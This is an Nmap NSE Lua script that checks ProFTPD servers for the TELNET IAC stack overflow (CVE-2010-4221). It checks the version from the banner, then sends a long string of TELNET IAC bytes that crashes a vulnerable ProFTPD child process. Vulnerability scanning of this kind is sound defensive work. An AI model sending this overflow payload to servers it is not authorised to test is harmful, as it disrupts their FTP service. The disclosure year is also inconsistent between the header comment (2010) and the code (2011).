local ftp = require "ftp"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

description = [[
Checks for a stack-based buffer overflow in the ProFTPD server, version
between 1.3.2rc3 and 1.3.3b. By sending a large number of TELNET_IAC escape
sequence, the proftpd process miscalculates the buffer length, and a remote
attacker will be able to corrupt the stack and execute arbitrary code within
the context of the proftpd process (CVE-2010-4221). Authentication is not
required to exploit this vulnerability.

Reference:
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4221
* http://www.exploit-db.com/exploits/15449/
* http://www.metasploit.com/modules/exploit/freebsd/ftp/proftp_telnet_iac
]]

---
-- @usage
-- nmap --script ftp-vuln-cve2010-4221 -p 21 <host>
--
-- @output
-- PORT   STATE SERVICE
-- 21/tcp open  ftp
-- | ftp-vuln-cve2010-4221: 
-- |   VULNERABLE:
-- |   ProFTPD server TELNET IAC stack overflow
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2010-4221  BID:44562  OSVDB:68985
-- |     Risk factor: High  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)
-- |     Description:
-- |       ProFTPD server (version 1.3.2rc3 through 1.3.3b) is vulnerable to
-- |       stack-based buffer overflow. By sending a large number of TELNET_IAC
-- |       escape sequence, a remote attacker will be able to corrup the stack and
-- |       execute arbitrary code.
-- |     Disclosure date: 2010-11-02
-- |     References:
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4221
-- |       http://osvdb.org/68985
-- |       http://www.metasploit.com/modules/exploit/freebsd/ftp/proftp_telnet_iac
-- |       http://bugs.proftpd.org/show_bug.cgi?id=3521
-- |_      http://www.securityfocus.com/bid/44562
--

author = "Djalal Harouni"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln"}


portrule = function (host, port)
  if port.version.product ~= nil and port.version.product ~= "ProFTPD" then
    return false
  end
  return shortport.port_or_service(21, "ftp")(host, port)
end

local function get_proftpd_banner(response)
  local banner, version
  banner = response:match("^%d+%s(.*)")
  if banner and banner:match("ProFTPD") then
    version = banner:match("ProFTPD%s([%w%.]+)%s")
  end
  return banner, version
end

local function ftp_finish(socket, status, message)
  if socket then
    socket:close()
  end
  return status, message
end

-- Returns true if the provided version is vulnerable
local function is_version_vulnerable(version)
  local vers = stdnse.strsplit("%.", version)
  
  if #vers > 0 and vers[3] then
    local relnum = string.sub(vers[3], 1, 1)
    local extra = string.sub(vers[3], 2)
    if relnum == '2' then
      if extra:len() > 0 then
        if extra:match("rc%d") then
          local v = string.sub(extra, 3)
          if v and tonumber(v) > 2 then
            return true
          end
        else
          return true
        end
      end
    elseif relnum == '3' then
      if extra:len() == 0 or extra:match("[abrc]") then
        return true
      end
    end
  end

  return false
end

-- Returns true, true if the ProFTPD child was killed
local function kill_proftpd(socket)
  local killed = false
  local TELNET_KILL = '\000'..'\255' -- TELNET_DUMMY..TELNET_IAC
  
  stdnse.print_debug(2, "%s: sending evil TELNET_IAC commands.",
                        SCRIPT_NAME)
  local st, ret = socket:send(string.rep(TELNET_KILL, 4069)..
                        '\255'..string.rep("Nmap", 256).."\n")
  if not st then
    return st, ret
  end

  -- We should receive command error if it's not vulnerable
  st, ret = socket:receive_lines(1)
  if not st then
    if ret == "EOF" then -- "connection closed"
      stdnse.print_debug(2, "%s: remote proftpd child was killed.",
                            SCRIPT_NAME)
      killed = true
    else
      return st, ret
    end
  end

  return true, killed
end

local function check_proftpd(ftp_opts)
  local ftp_server = {}
  local socket, ret = ftp.connect(ftp_opts.host, ftp_opts.port,
                                 {recv_before = true})
  if not socket then
    return socket, ret
  end

  ftp_server.banner, ftp_server.version = get_proftpd_banner(ret)
  if not ftp_server.banner then
    return ftp_finish(socket, false, "failed to get FTP banner.")
  elseif not ftp_server.banner:match("ProFTPD") then
    return ftp_finish(socket, false, "not a ProFTPD server.")
  end

  local vuln = ftp_opts.vuln
  -- check if this version is vulnerable
  if ftp_server.version then
    if not is_version_vulnerable(ftp_server.version) then
      vuln.state = vulns.STATE.NOT_VULN
      return ftp_finish(socket, true)
    end
    vuln.state = vulns.STATE.LIKELY_VULN
  end

  local status, killed = kill_proftpd(socket)
  if not status then
    return ftp_finish(socket, false, killed)
  elseif killed then
    vuln.state = vulns.STATE.VULN
  elseif not vuln.state then
    vuln.state = vulns.STATE.NOT_VULN
  end

  return ftp_finish(socket, true)
end

action = function(host, port)
  local ftp_opts = {
    host = host,
    port = port,
    vuln = {
      title = 'ProFTPD server TELNET IAC stack overflow',
      IDS = {CVE = 'CVE-2010-4221', OSVDB = '68985', BID = '44562'},
      risk_factor = "High",
      scores = {
        CVSSv2 = "10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)",
      },
      description = [[
ProFTPD server (version 1.3.2rc3 through 1.3.3b) is vulnerable to
stack-based buffer overflow. By sending a large number of TELNET_IAC
escape sequence, a remote attacker will be able to corrup the stack and
execute arbitrary code.]],
      references = {
'http://bugs.proftpd.org/show_bug.cgi?id=3521',
'http://www.metasploit.com/modules/exploit/freebsd/ftp/proftp_telnet_iac',
      },
      dates = {
        disclosure = {year = 2011, month = 11, day = 02},
      },
    }
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  local status, err = check_proftpd(ftp_opts)
  if not status then
    stdnse.print_debug(1, "%s: %s", SCRIPT_NAME, err)
    return nil
  end
  return report:make_output(ftp_opts.vuln)
end
